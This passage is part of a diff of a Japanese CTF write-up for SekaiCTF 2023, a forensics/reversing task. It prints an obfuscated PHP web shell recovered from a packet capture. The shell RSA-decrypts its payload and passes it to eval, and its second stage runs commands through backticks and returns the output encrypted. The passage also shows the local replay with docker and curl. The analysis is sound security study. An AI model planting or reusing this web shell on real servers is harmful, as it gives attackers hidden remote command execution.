EKvgZ9B3K7sct8BoeBG/PKbp8a8AC9AbWPqnjYSIcFNkexdH1lXJrvgLKrC4UaqpMdi+Zqu96oc3695VfN0zspAKZkjEUwU8PA+En7R5qwSMD4QLop+2qZ+Tx1DC7Y2QwvqH7kAxwwloou45zw=,eTJY1cWk0XfO166TYwkvxA+6A6Ee5xXv53PtV7nbblXGx8PlVXUa5DU/dAXzTuyO1Ykkh16t0TKlyF/7X1G2S5z8RPjmyzIwhALHWw+zvWhE5hDf3lhZ1co6L9/Y7nSgKwUuWTsi1ZPqlrJTTlCyE+gNJE4M+Rh8QfJ/YQsWMBM=,BBeqrThbTcuSguT+9V2a5w2zTeL2GG+WZx26DXy0Y/sH8D85PMTk2lsVNs0e+yj06RfAkQuq6LrYVyEC9wB63ovSKxKIY0vZLaqxwZwA8RdzVcoOrx1/+acY1WqgeG8ZJdXCK7DFcRakkAclhZYNwJO+yKvto+ytvbWcKo0eeDI=,i5rXk8yQ4RVFvlY+sKFvlD19qAA8+9qTtzEGHXeSI9O+v2TDAoLJQuNnp+m3WTReKf8WN3sZ4CTpvUpXR0UYbZ1TUSHRyvWTkm+2P6E4DXdRvotwp+HyviELbjTrn0ajilPV3+X3DF1m1MaDo5v03gBIFRxCuDJM3CYk8KFw/kQ=,"</span><span class="token punctuation">;</span>
+<span class="token variable">$a4b1af</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+
+<span class="token variable">$af5e94</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span> <span class="token variable">$aa13a9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$af5e94</span> <span class="token keyword">as</span> <span class="token variable">$a64500</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">openssl_private_decrypt</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$a64500</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$a64500</span><span class="token punctuation">,</span> <span class="token variable">$afd8f0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$a4b1af</span> <span class="token operator">.=</span> <span class="token variable">$a64500</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a4b1af</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a4b1af</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?></span></span></code></pre></div>
+<p>pcap から抽出した POST データを file.bin として保存してローカルで攻撃を再現します。</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># PHPサーバの起動</span>
+<span class="token function">docker</span> run --net <span class="token function">host</span> --rm -it -v <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>:/root php <span class="token function">bash</span>
+php -S <span class="token number">127.0</span>.0.1:8080
+
+<span class="token comment"># ファイルの送信</span>
+<span class="token function">curl</span> -X POST -F <span class="token assign-left variable">file</span><span class="token operator">=</span>@./file.bin http://localhost:8080/date.php</code></pre></div>
+<p>最後の <code class="language-text">eval($a4b1af)</code> の値を print デバッグしてみると以下の PHP スクリプトを取得できました。</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token variable">$pvk1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"-----BEGIN RSA PRIVATE KEY-----
+MIICXAIBAAKBgQCyYg7DzqjtPGCUT+q38iZcQDqZFC+lIxqo+g1/OhT45AMPtea0
+habVZX77whFsQz5zE3fUXLZCzDnZpvtfr4Y8JSzGdL7O0qf3KAQIfk26YQeKOOje
+ECNi5zUk3wf+5QUZjXnvDj+BUr78fV57zMpCBe65+mTiBpFkzsNTYo+VxwIDAQAB
+AoGBAKyHPrSPer8JOHf525DRudxbmtFXvsU/cJeiUc+Nw57+GR/m1R4gbj3TDsA8
+8VD+sLXoTGuux/FPSVyDrnjbcT25akm0FE+KkBZ6dNLFtOq6WQTe3N8HHDHkpqbZ
+qXbmuph4MqZlDpKMbEL1cQ81MkgAdPJnljvrjpIoqn5wZ7cRAkEA1+SjeaueSCu4
+4VzXTDOMkBqT5rEfJXnT7fN9eM48dXCd1LotWIL/2xcGkC4OdqT0kQiSs4pOQlcn
+Lle18qOL5QJBANOFh3aaoGDfH60ecX2MHDnvHz4CSAIInlNXsPpbhWrt7blmGBeA
+nuwIiaQOMzvrj084xk3nI8PMIzdgxUFveDsCQA2w1h0VIQh6nVLNTGnsqvFIfjCW
+8t6xhxsD4eUTTwozhg7Db7S5Ofhu0V+7S/eCJnA8FvGDx8q1NCrgLQ2iCXECQDl2
+cRKbdy5Z7zUMrDA7O//RIl+qJv3GcZyamg2ph1lBQe+3+JuJ6aKdvya+ZNTGbaxL
+9DN9s42hi3+j3nKkYbkCQDy68qEICIdcLPFzv/sEN2JS1Cg21lJMH14ao0M3Di9B
+G4oDHVBHCRtDGXOviR8AG0VpghDHheonDFaX5O7VXUM=
+-----END RSA PRIVATE KEY-----
+"</span><span class="token punctuation">;</span>
+<span class="token variable">$pbk1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyucnknkBP4whz0YJrblke667f
+5g4EfCmKcO2j7c+WEOWmbVBRZ/ETtqOIEM8Hp9rV605R1gJBf7tcxziEoX4wxQm5
+nfAqXkHUdloGyK7p7IZTh5tX6KnckCtrwbD7EFwjWBBceVHRmnmVdtF4yIkwaD2S
+4tw4O5CVYcIlIAAo6QIDAQAB
+-----END PUBLIC KEY-----
+"</span><span class="token punctuation">;</span>
+<span class="token function">openssl_private_decrypt</span><span class="token punctuation">(</span><span class="token variable">$ae25f0</span><span class="token punctuation">,</span> <span class="token variable">$decrypted</span><span class="token punctuation">,</span> <span class="token variable">$pvk1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string backtick-quoted-string">`{$decrypted} 2>&amp;1`</span><span class="token punctuation">;</span>
+<span class="token variable">$encrypted</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$chunks</span> <span class="token operator">=</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$chunks</span> <span class="token keyword">as</span> <span class="token variable">$chunk</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">openssl_public_encrypt</span><span class="token punctuation">(</span><span class="token variable">$chunk</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">,</span> <span class="token variable">$pbk1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$encrypted</span> <span class="token operator">.=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">","</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token variable">$encrypted</span><span class="token punctuation">;</span></code></pre></div>
+<p>これを PHP に埋め込んで $decrypted を print する行を追加してからもう一度 POST リクエストを送ると、以下のように正しい Flag を取得することに成功しました。</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/b90b3a65b8fb9f8baa1b78093442e890/0c1c2/image-20230830220836552.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 10%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAf0lEQVQI1z3MsQ6CMBRGYVY3DYibBqU4CIUaY0nbS4vv/07HyuDw5eT+wy2iXQiTRzrLpwskJURliSZ3EmSYCb39+92iZ5LxW183vXkrg7n0FOnuWK+BpVmQJj9sI2ubkLPH1QZfalyl8dWY5R5HQiYns212/2A+9Lhy4LlTfAEiFz65+BTHmgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/b90b3a65b8fb9f8baa1b78093442e890/8ac56/image-20230830220836552.webp 240w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/d3be9/image-20230830220836552.webp 480w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/e46b2/image-20230830220836552.webp 960w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/f992d/image-20230830220836552.webp 1440w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/64634/image-20230830220836552.webp 1542w"
+              sizes="(max-width: 960px) 100vw, 960px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/b90b3a65b8fb9f8baa1b78093442e890/8ff5a/image-20230830220836552.png 240w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/e85cb/image-20230830220836552.png 480w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/d9199/image-20230830220836552.png 960w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/07a9c/image-20230830220836552.png 1440w,
+/static/b90b3a65b8fb9f8baa1b78093442e890/0c1c2/image-20230830220836552.png 1542w"
+            sizes="(max-width: 960px) 100vw, 960px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/b90b3a65b8fb9f8baa1b78093442e890/d9199/image-20230830220836552.png"
+            alt="image-20230830220836552"
+            title="image-20230830220836552"
+            loading="lazy"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
 <h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
 <p>コンテスト出るたびに実力不足を痛感。</p>
-<p>少しずつでも着実にレベルアップできていればいいのだけれど。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Aug 28, 2023</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/ctf/">CTF</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/forensic/">Forensic</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-sekaictf-2023";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-d5650cb600212674c03b.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-d5650cb600212674c03b.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-8d128062fbe26704a1ed.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>
+<p>少しずつでも着実にレベルアップできていればいいのだけれど。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Aug 28, 2023</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/ctf/">CTF</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/forensic/">Forensic</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-sekaictf-2023";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-deac8c16bc866e501791.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-deac8c16bc866e501791.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-b4913a7476bc50bd9bf8.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>
